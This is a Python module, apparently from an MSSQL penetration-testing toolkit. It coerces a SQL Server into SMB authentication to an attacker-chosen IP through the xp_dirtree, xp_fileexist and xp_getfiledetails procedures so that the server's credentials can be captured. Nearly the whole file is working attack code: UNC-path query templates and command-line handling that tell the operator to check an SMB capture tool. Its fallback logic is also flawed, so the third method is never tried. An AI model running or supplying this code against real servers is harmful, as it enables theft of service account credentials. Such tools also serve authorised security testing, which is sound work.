#!/usr/bin/python
# -*- coding: utf-8 -*-

import logging
from Mssql import Mssql
from Utils import ErrorClass, checkOptionsGivenByTheUser
from Constants import *

class SMBAuthenticationCapture (Mssql):
	'''
	To cature a SMB AUthentication
	'''
	#CONSTANTES
	REQ_SMB_AUTHENTICATION_VIA_XP_DIRTREE = "xp_dirtree '\\\\{0}\{1}'" #{0}=ip, {1}=sharename
	REQ_SMB_AUTHENTICATION_VIA_XP_FILEEXIST = "xp_fileexist '\\\\{0}\{1}'" #{0}=ip, {1}=sharename
	REQ_SMB_AUTHENTICATION_VIA_XP_GETFILEDETAILS = "xp_getfiledetails'\\\\{0}\{1}'" #{0}=ip, {1}=sharename
	
	def __init__(self, args, localIp, shareName=DEFAULT_SHARE_NAME):
		'''
		Constructor
		'''
		Mssql.__init__(self, args=args)
		self.localIp = localIp
		self.shareName = shareName
		
	def captureSMBAuthenticationViaXpDirtree (self):
		'''
		Capture SMB Authentication via XP_DIRTREE
		Return True if no error
		else: return error
		'''
		logging.info("Capturing SMB Authentication via XP_DIRTREE...")
		data = self.executeRequest(self.REQ_SMB_AUTHENTICATION_VIA_XP_DIRTREE.format(self.localIp, self.shareName),ld=['subdirectory','depth'])
		if isinstance(data,Exception):
			logging.debug("Impossible to capture the SMB authentication: {0}".format(data))
		else: 
			logging.info("No error during the running: you could capture the SMB authentication")
			return True
			
	def captureSMBAuthenticationViaXpFileexist (self):
		'''
		Capture SMB Authentication via XP_FILEEXIST
		Return True if no error
		else: return error
		'''
		logging.info("Capturing SMB Authentication via XP_FILEEXIST...")
		data = self.executeRequest(self.REQ_SMB_AUTHENTICATION_VIA_XP_FILEEXIST.format(self.localIp, self.shareName),ld=['File Exists','File is a Directory','Parent Directory Exists'])
		if isinstance(data,Exception):
			logging.debug("Impossible to capture the SMB authentication: {0}".format(data))
		else: 
			logging.info("No error during the running: you could capture the SMB authentication")
			return True
		
	def captureSMBAuthenticationViaXpGetFileDetails (self):
		'''
		Normally, Windows 2000 only
		Capture SMB Authentication via XP_GETFILEDETAILS
		Return True if no error
		else: return error
		'''
		logging.info("Capturing SMB Authentication via XP_GETFILEDETAILS...")
		data = self.executeRequest(self.REQ_SMB_AUTHENTICATION_VIA_XP_GETFILEDETAILS.format(self.localIp, self.shareName),ld=['1','2','3','4','5','6','7','8','9'])
		if isinstance(data,Exception):
			if self.isThe2000Version() == False: logging.debug("Impossible to capture the SMB authentication via XP_GETFILEDETAILS because you are not on a MSSQL 2000: {0}".format(data))
			else: logging.debug("Impossible to capture the SMB authentication: {0}".format(data))
		else: 
			logging.info("No error during the running: you could capture the SMB authentication")
			return True
		
	def tryToCaptureASmbAuthentication (self):
		'''
		Capture SMB authentication
		Return True if a method is ok
		otherwise return False
		'''
		logging.info("Test all methods allowing to capture a SMB authentication...")
		data = self.captureSMBAuthenticationViaXpDirtree()
		if data != True: 
			data = self.captureSMBAuthenticationViaXpFileexist()
		elif data != True: 
			data = self.captureSMBAuthenticationViaXpGetFileDetails()
		elif data != True :
			logging.info("No method allows to capture a SMB authentication")
			return False
		return True
		
	def testAll (self):
		'''
		Test all functions
		'''
		self.args['print'].subtitle("Can you capture a SMB authentication ?")
		status = self.tryToCaptureASmbAuthentication()
		if status == False:
			self.args['print'].badNews("KO")
		else :
			self.args['print'].unknownNews("? (perhaps)")
		
def runSMBAuthenticationCaptureModule(args):
	'''
	Run the SMBAuthenticationCapture module
	'''
	if checkOptionsGivenByTheUser(args,["capture","xp-dirtree-capture","xp-fileexist-capture","xp-getfiledetails-capture"],checkAccount=True) == False : return EXIT_MISS_ARGUMENT
	if args["capture"] != None: smbAuthenticationCapture = SMBAuthenticationCapture(args,args['capture'][0],args['share-name'][0])
	elif args["xp-dirtree-capture"] != None: smbAuthenticationCapture = SMBAuthenticationCapture(args,args["xp-dirtree-capture"][0],args['share-name'][0])
	elif args["xp-fileexist-capture"] != None: smbAuthenticationCapture = SMBAuthenticationCapture(args,args["xp-fileexist-capture"][0],args['share-name'][0])
	elif args["xp-getfiledetails-capture"] != None: smbAuthenticationCapture = SMBAuthenticationCapture(args,args["xp-getfiledetails-capture"][0],args['share-name'][0])
	smbAuthenticationCapture.connect()
	if args["test-module"] == True: smbAuthenticationCapture.testAll()
	if args["capture"] != None:
		args['print'].title("Try to capture a SMB authentication with the xp_dirtree, xp_fileexist or xp_getfiledetails method")
		status = smbAuthenticationCapture.tryToCaptureASmbAuthentication()
		if status == True:
			args['print'].unknownNews("You can perhaps capture a SMB authentication with these methods. Check your SMB capture tool !")
		else :
			args['print'].badNews("You can't capture a SMB authentication with these methods")
	elif args["xp-dirtree-capture"] != None:
		args['print'].title("Try to capture a SMB authentication with the xp_dirtree method only")
		status = smbAuthenticationCapture.captureSMBAuthenticationViaXpDirtree()
		if status == True:
			args['print'].unknownNews("You can perhaps capture a SMB authentication with the xp_dirtree method. Check your SMB capture tool !")
		else :
			args['print'].badNews("You can't capture a SMB authentication with the xp_dirtree method")
	elif args["xp-fileexist-capture"] != None:
		args['print'].title("Try to capture a SMB authentication with the xp_fileexist method only")
		status = smbAuthenticationCapture.captureSMBAuthenticationViaXpFileexist()
		if status == True:
			args['print'].unknownNews("You can perhaps capture a SMB authentication with the xp_fileexist method. Check your SMB capture tool !")
		else :
			args['print'].badNews("You can't capture a SMB authentication with the xp_fileexist method")
	elif args["xp-getfiledetails-capture"] != None:
		args['print'].title("Try to capture a SMB authentication with the xp_getfiledetails method only")
		status = smbAuthenticationCapture.captureSMBAuthenticationViaXpGetFileDetails()
		if status == True:
			args['print'].unknownNews("You can perhaps capture a SMB authentication with the xp_getfiledetails method. Check your SMB capture tool !")
		else :
			args['print'].badNews("You can't capture a SMB authentication with the xp_getfiledetails method")
	smbAuthenticationCapture.closeConnection()
		
		
		
		
		
		
		
